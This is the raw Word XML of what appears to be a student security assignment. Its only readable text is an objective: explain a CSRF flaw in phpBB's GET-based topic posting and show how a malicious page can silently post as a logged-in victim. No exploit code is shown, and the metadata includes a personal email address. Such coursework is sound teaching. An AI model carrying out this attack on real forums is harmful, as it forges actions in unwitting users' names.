          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B7167B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Objective: </w:t>
      </w:r>
      <w:r w:rsidRPr="00B7167B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Analyze a vulnerable web application (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B7167B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>phpBB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B7167B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) that allows posting new topics using an HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B7167B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>GET request, which can be exploited via CSRF. Explain the vulnerability and demonstrate how a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B7167B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>malicious webpage can silently create a new post on behalf of a logged-in victim.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66916B68" w14:textId="77777777" w:rsidR="00C35DE6" w:rsidRDefault="00C35DE6" w:rsidP="005A45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6AED4414" w14:textId="77777777" w:rsidR="009C0521" w:rsidRDefault="009C0521" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B5DD34F" w14:textId="77777777" w:rsidR="009C0521" w:rsidRDefault="009C0521" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61758334" w14:textId="4CDEDF1E" w:rsidR="009C0521" w:rsidRPr="005A4576" w:rsidRDefault="009C0521" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:sectPr w:rsidR="009C0521" w:rsidRPr="005A4576" w:rsidSect="005A4576">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1820" w:right="1080" w:bottom="280" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E0D1548" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BF5EEFC" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18EB3BD1" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42241015" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C988282" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E073B33" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31262E1E" w14:textId="23FA682E" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:before="10"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F669FA7" w14:textId="4B253D5B" w:rsidR="005A4576" w:rsidRPr="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="005A4576" w:rsidRPr="005A4576" w:rsidSect="00F11BB3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9421C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B86E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134EF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F4A62A86"/>
    <w:lvl w:ilvl="0" w:tplc="AF44694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6C85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85CC70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01696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244D5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3AA2E1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FE66CD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C0680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D66A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2B5586B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="95EAC044"/>
    <w:lvl w:ilvl="0" w:tplc="6D64F33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8CADA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7CA17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2DCAB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00C62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15C6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544A6D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F927EE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D9825E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F6E080C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CF101F4C"/>
    <w:lvl w:ilvl="0" w:tplc="F274F3FE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1BFC05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788F39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09814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A405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784B33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820AB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61E589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9A603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52362AE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BB38D1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8340B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AA7C03C0"/>
    <w:lvl w:ilvl="0" w:tplc="552E2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90F202"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C05A0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9D48A1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63BA42A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60B2EC1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79CD0C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0B696E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DB08820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D1B2902"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BE8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711A2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="67CC8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788879">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="2067874545">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1767841700">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1566063050">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="920993391">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1695960716">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1337879172">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1178959529">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="206838632">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="745688955">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1098677135">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1494488051">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1127628761">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="1317563369">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1044255023">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="254438934">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="4048854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B2E"/>
    <w:rsid w:val="00126359"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003948F9"/>
    <w:rsid w:val="003F44EC"/>
    <w:rsid w:val="0042402A"/>
    <w:rsid w:val="004F7C0D"/>
    <w:rsid w:val="00550FB2"/>
    <w:rsid w:val="005A4576"/>
    <w:rsid w:val="007B7BAC"/>
    <w:rsid w:val="007E40AD"/>
    <w:rsid w:val="00800C8E"/>
    <w:rsid w:val="00844F03"/>
    <w:rsid w:val="008A0917"/>
    <w:rsid w:val="009378E9"/>
    <w:rsid w:val="009C0521"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00B7167B"/>
    <w:rsid w:val="00C35DE6"/>
    <w:rsid w:val="00C53DF4"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D81DDD"/>
    <w:rsid w:val="00E16915"/>
    <w:rsid w:val="00F0568F"/>
    <w:rsid w:val="00F11BB3"/>
    <w:rsid w:val="00F73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4A1D1"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{330CA81F-BBD1-42BC-A758-1D34D9E7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11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08675B61984DDEAF07EE899ED49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0C13A-0F30-48EB-853B-7B632080EA9C}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00C91C6A" w:rsidRDefault="004158A3" w:rsidP="004158A3">
          <w:pPr>
            <w:pStyle w:val="3608675B61984DDEAF07EE899ED4976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5AF04E45A584475AA9AA9411F121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668C3-6D37-4E9F-ACEF-0EEFE28E29F0}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00C91C6A" w:rsidRDefault="004158A3" w:rsidP="004158A3">
          <w:pPr>
            <w:pStyle w:val="25AF04E45A584475AA9AA9411F12198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A3"/>
    <w:rsid w:val="00126359"/>
    <w:rsid w:val="004158A3"/>
    <w:rsid w:val="00635EDE"/>
    <w:rsid w:val="00844F03"/>
    <w:rsid w:val="00A77A24"/>
    <w:rsid w:val="00B2311F"/>
    <w:rsid w:val="00C07CB4"/>
    <w:rsid w:val="00C91C6A"/>
    <w:rsid w:val="00D81DDD"/>
    <w:rsid w:val="00F0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08675B61984DDEAF07EE899ED4976F">
    <w:name w:val="3608675B61984DDEAF07EE899ED4976F"/>
    <w:rsid w:val="004158A3"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="25AF04E45A584475AA9AA9411F121987">
    <w:name w:val="25AF04E45A584475AA9AA9411F121987"/>
    <w:rsid w:val="004158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 assignment</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Manager/>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>6708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assignment</dc:title>
  <dc:subject>A # 03</dc:subject>
  <dc:creator>22F-3875</dc:creator>
  <cp:keywords/>
  <dc:description>generated by python-docx</dc:description>
  <cp:lastModifiedBy>faizanyousaf140@gmail.com</cp:lastModifiedBy>
  <cp:revision>11</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-09-24T18:48:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-26T12:24:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>